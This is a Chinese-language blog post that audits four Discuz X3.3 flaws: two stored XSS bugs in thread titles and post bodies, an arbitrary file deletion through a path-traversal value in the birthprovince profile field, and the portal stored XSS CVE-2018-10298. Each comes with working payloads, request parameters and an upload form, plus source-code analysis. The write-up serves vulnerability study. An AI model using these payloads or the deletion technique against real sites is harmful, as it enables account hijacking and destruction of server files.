---
title: Discuz漏洞分析
date: 2018-08-25 16:54:53
tags:
	- 代码审计
	- discuz
	- php
---



# Discuz 标题存储型XSS

测试环境 Discuz x3.3 utf-8

## 漏洞利用

首先需要在后台开启四方格功能（很多discuz网站一般都是开的

![](Discuz漏洞分析\1.png)



然后在发帖标题设为

```
&#x003c;img src=1 onerror=alert(1)&#x003e;
```

![](Discuz漏洞分析\2.png)

回到主页之后，当鼠标划过主题名称的时候，就会触发漏洞

![](Discuz漏洞分析\3.png)



## 漏洞分析

检查元素的时候可以看到，这里触发了`onmouseover`

![](Discuz漏洞分析\4.png)

这个函数的位置在`discuz\static\js\common.js`中

```js
function showTip(ctrlobj) {
	$F('_showTip', arguments);
}
```

继续跟踪一下

```javascript
function _showTip(ctrlobj) {
	if(!ctrlobj.id) {
		ctrlobj.id = 'tip_' + Math.random();
	}
	menuid = ctrlobj.id + '_menu';
	if(!$(menuid)) {
		var div = document.createElement('div');
		div.id = ctrlobj.id + '_menu';
		div.className = 'tip tip_4';
		div.style.display = 'none';
		div.innerHTML = '<div class="tip_horn"></div><div class="tip_c">' + ctrlobj.getAttribute('tip') + '</div>';
		$('append_parent').appendChild(div);
	}
	$(ctrlobj.id).onmouseout = function () { hideMenu('', 'prompt'); };
	showMenu({'mtype':'prompt','ctrlid':ctrlobj.id,'pos':'12!','duration':2,'zindex':JSMENU['zIndex']['prompt']});
}
```

可以看到这里利用`ctrlobj.getAttribute('tip')`取出tip属性

`getAtrribute`函数获取属性值时会自动解码实体编码后的值，从而导致了xss的触发

这里还有一个点就是，discuz中的html编码函数

```php
function dhtmlspecialchars($string, $flags = null) {
	if(is_array($string)) {
		foreach($string as $key => $val) {
			$string[$key] = dhtmlspecialchars($val, $flags);
		}
	} else {
		if($flags === null) {
			$string = str_replace(array('&', '"', '<', '>'), array('&amp;', '&quot;', '&lt;', '&gt;'), $string);
			if(strpos($string, '&amp;#') !== false) {
				$string = preg_replace('/&amp;((#(\d{3,5}|x[a-fA-F0-9]{4}));)/', '&\\1', $string);
			}
		} else {
			if(PHP_VERSION < '5.4.0') {
				$string = htmlspecialchars($string, $flags);
			} else {
				if(strtolower(CHARSET) == 'utf-8') {
					$charset = 'UTF-8';
				} else {
					$charset = 'ISO-8859-1';
				}
				$string = htmlspecialchars($string, $flags, $charset);
			}
		}
	}
	return $string;
}
```

会先对`&`、`"`、`<`、`>`进行编码

然后又会对符合`'/&amp;((#(\d{3,5}|x[a-fA-F0-9]{4}));)/'`正则的字符进行还原，

从而payload里只能插入`&#x003c;`而不应该是`&#x3c;`，也算是discuz的一个小特性把



# Discuz 正文存储型XSS

测试环境 Discuz x3.3 utf-8

## 漏洞利用

以非PC端查看，这里可以直接利用chrome的调试功能，改成手机模式即可

这回的帖子标题随意，在正文中插入

```
[media=mp3,200,300]http://www.tudou.com/programs/view/a' onload=alert(1) onerror=alert(1)[/media]
```

以手机端访问的时候就能触发XSS

![](Discuz漏洞分析\5.png)

## 漏洞分析

在`discuz\source\function\function_discuzcode.php`大约684行处，返回了这样一段js

```php
$width = addslashes($width);
$height = addslashes($height);
$flv = addslashes($flv);
$iframe = addslashes($iframe);
$randomid = 'flv_'.random(3);
$enablemobile = $iframe ? 'mobileplayer() ? "<iframe height=\''.$height.'\' width=\''.$width.'\' src=\''.$iframe.'\' frameborder=0 allowfullscreen></iframe>" : ' : '';
return '<span id="'.$randomid.'"></span><script type="text/javascript" reload="1">$(\''.$randomid.'\').innerHTML=('.$enablemobile.'AC_FL_RunContent(\'width\', \''.$width.'\', \'height\', \''.$height.'\', \'allowNetworking\', \'internal\', \'allowScriptAccess\', \'never\', \'src\', \''.$flv.'\', \'quality\', \'high\', \'bgcolor\', \'#ffffff\', \'wmode\', \'transparent\', \'allowfullscreen\', \'true\'));</script>';
```

在帖子的html页面中能够看到生成的这段代码

```html
<span id="flv_hiT"></span><script type="text/javascript" reload="1">$('flv_hiT').innerHTML=(mobileplayer() ? "<iframe height='300' width='200' src='http://www.tudou.com/programs/view/html5embed.action?code=a\\\' onload=alert(1) onerror=alert(1)' frameborder=0 allowfullscreen></iframe>" : AC_FL_RunContent('width', '200', 'height', '300', 'allowNetworking', 'internal', 'allowScriptAccess', 'never', 'src', 'http://www.tudou.com/v/a\\\' onload=alert(1) onerror=alert(1)', 'quality', 'high', 'bgcolor', '#ffffff', 'wmode', 'transparent', 'allowfullscreen', 'true'));</script></td></tr></table>

```

只有在手机端的时候，才会加载iframe标签

可以看到虽然加了`\`转义符，但是其实并没有不会影响单引号的闭合

因为如下的代码都是可以引起弹窗的

```html
<img src="x \" onerror=alert(1)>
<img src='x \' onerror=alert(2)>
```

因而做了无用的`addslashes`，并没有起到作用，引发了xss

## 

# Discuz 任意文件删除

测试环境 Discuz x3.3 utf-8

## 漏洞利用

先登录到个人中心，修改资料处

```
http://localhost/discuz/home.php?mod=spacecp&ac=profile
```

post提交参数，修改出生地（formhash可以在html代码中找到

```
birthprovince=../../../test.txt
&profilesubmit=1
&formhash=63b23997
```

就可以看到出生年月被改成了自定义的字符

![](Discuz漏洞分析\6.png)

先在首页创建一个test.txt

![](Discuz漏洞分析\7.png)

然后构造表单，往该页面上传文件，任意图片即可

```html
<form action="http://localhost/discuz/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa" method="POST" enctype="multipart/form-data">
<input type="file" name="birthprovince" id="file" />
<input type="text" name="formhash" value="63b23997"/></p>
<input type="text" name="profilesubmit" value="1"/></p>
<input type="submit" value="Submit" />
</form>
```

然后test.txt被成功删除

![](Discuz漏洞分析\8.png)



## 漏洞分析

根据url可以追溯到如下文件中

```
discuz\source\include\spacecp\spacecp_profile.php
```

前面是一些提交判断，主要来到文件上传的部分，大约187行附近

```php
if($_FILES) {
    $upload = new discuz_upload();
    foreach($_FILES as $key => $file) {
        if(!isset($_G['cache']['profilesetting'][$key])) {
            continue;
        }
        $field = $_G['cache']['profilesetting'][$key];
        if((!empty($file) && $file['error'] == 0) || (!empty($space[$key]) && empty($_GET['deletefile'][$key]))) {
            $value = '1';
        } else {
            $value = '';
        }
        if(!profile_check($key, $value, $space)) {
            profile_showerror($key);
        } elseif($field['size'] && $field['size']*1024 < $file['size']) {
            profile_showerror($key, lang('spacecp', 'filesize_lessthan').$field['size'].'KB');
        }
        $upload->init($file, 'profile');
        $attach = $upload->attach;

        if(!$upload->error()) {
            $upload->save();

            if(!$upload->get_image_info($attach['target'])) {
                @unlink($attach['target']);
                continue;
            }
            $setarr[$key] = '';
            $attach['attachment'] = dhtmlspecialchars(trim($attach['attachment']));
            if($vid && $verifyconfig['available'] && isset($verifyconfig['field'][$key])) {
                if(isset($verifyinfo['field'][$key])) {
                    @unlink(getglobal('setting/attachdir').'./profile/'.$verifyinfo['field'][$key]);
                    $verifyarr[$key] = $attach['attachment'];
                }
                continue;
            }
            if(isset($setarr[$key]) && $_G['cache']['profilesetting'][$key]['needverify']) {
                @unlink(getglobal('setting/attachdir').'./profile/'.$verifyinfo['field'][$key]);
                $verifyarr[$key] = $attach['attachment'];
                continue;
            }
            @unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);
            $setarr[$key] = $attach['attachment'];
        }

    }
}
```

初始化了一个discuz的文件上传类，前面做了一些文件类型之类的判断

真正删除文件的是在228行

```php
@unlink(getglobal('setting/attachdir').'./profile/'.$space[$key]);
```

本意应该是，上传成功之后，将原本的旧文件给删除

`$space`在文件一开头就能看到，是一个用户个人信息的数组

```php
$space = getuserbyuid($_G['uid']);
```

由于我们一开始将`birthprovince`设置成了`../../../test.txt`

于是旧文件就变成了`../../../test.txt`从而导致了任意文件删除



# Discuz X portal存储型XSS

感谢下这位师傅超级详细的漏洞分析，是一个很好的学习discuz逻辑处理的文章

https://laworigin.github.io/2018/04/22/Discuz-x-portal-Stored-XSS-CVE-2018-10298/

## 漏洞利用

需要开启门户模块

在`http://localhost/discuz/portal.php?mod=portalcp&ac=article&catid=1`处可发表文章

插入一张如下的图片`x" onerror=alert(1);//`

![](Discuz漏洞分析\9.png)

然后发布，其实刚提交完就有反射型的xss了

查看文章就有弹窗了

![](Discuz漏洞分析\10.png)

审查一下元素看看，可以看到这里成功的插入了onerror属性

![](Discuz漏洞分析\11.png)



## 漏洞分析

根据url我们就可以快速定位到`discuz\source\include\portalcp\portalcp_article.php`中

前面是一些条件的判断，主要的过滤部分，173行附近

```php
$content = getstr($_POST['content'], 0, 0, 0, 0, 1);
$content = censor($content);
```

getstr是discuz中一个防范xss，进行合理编码和过滤的函数，跟进看一下

```php
function getstr($string, $length = 0, $in_slashes=0, $out_slashes=0, $bbcode=0, $html=0) {
	global $_G;

	$string = trim($string);
	$sppos = strpos($string, chr(0).chr(0).chr(0));
	if($sppos !== false) {
		$string = substr($string, 0, $sppos);
	}
	if($in_slashes) {
		$string = dstripslashes($string);
	}
	$string = preg_replace("/\[hide=?\d*\](.*?)\[\/hide\]/is", '', $string);
	if($html < 0) {
		$string = preg_replace("/(\<[^\<]*\>|\r|\n|\s|\[.+?\])/is", ' ', $string);
	} elseif ($html == 0) {
		$string = dhtmlspecialchars($string);
	}

	if($length) {
		$string = cutstr($string, $length);
	}

	if($bbcode) {
		require_once DISCUZ_ROOT.'./source/class/class_bbcode.php';
		$bb = & bbcode::instance();
		$string = $bb->bbcode2html($string, $bbcode);
	}
	if($out_slashes) {
		$string = daddslashes($string);
	}
	return trim($string);
}
```

可以看到这里将最后一个`$html`参数设为了1，也就意味着绕过了这两个条件判断

```php
if($html < 0) {
    $string = preg_replace("/(\<[^\<]*\>|\r|\n|\s|\[.+?\])/is", ' ', $string);
} elseif ($html == 0) {
    $string = dhtmlspecialchars($string);
}
```

从而既没有正则匹配，也没有进行html编码，导致了字符的逃逸

然后就顺利的插入到了数据库中

![](Discuz漏洞分析\12.png)



在输出的过程中也是直接从数据库中取出

`discuz\source\module\portal\portal_view.php`

```php
$content = $contents = array();
$multi = '';

$content = C::t('portal_article_content')->fetch_by_aid_page($aid, $page);
```

在模板中也是直接进行了输出

`discuz\data\template\1_diy_portal_view.tpl.php`

```php
<?php echo $content['content'];?>
```

从而导致了xss



感觉这回的xss分析算是最详细的一次了，从数据的读取和存入，以及取出，都做了源码上的分析，也对discuz的逻辑框架有了比较清晰的认识









# Reference Link

https://leveryd.github.io/2017-10-11-Discuz%E5%AD%98%E5%82%A8%E5%9E%8Bxss-1/

https://leveryd.github.io/2017-10-30-Disucz%E6%AD%A3%E6%96%87%E5%AD%98%E5%82%A8%E5%9E%8BXSS-2/

https://paper.seebug.org/411/#0x02

https://www.cnblogs.com/xiaozi/p/7616539.html

https://laworigin.github.io/2018/04/22/Discuz-x-portal-Stored-XSS-CVE-2018-10298/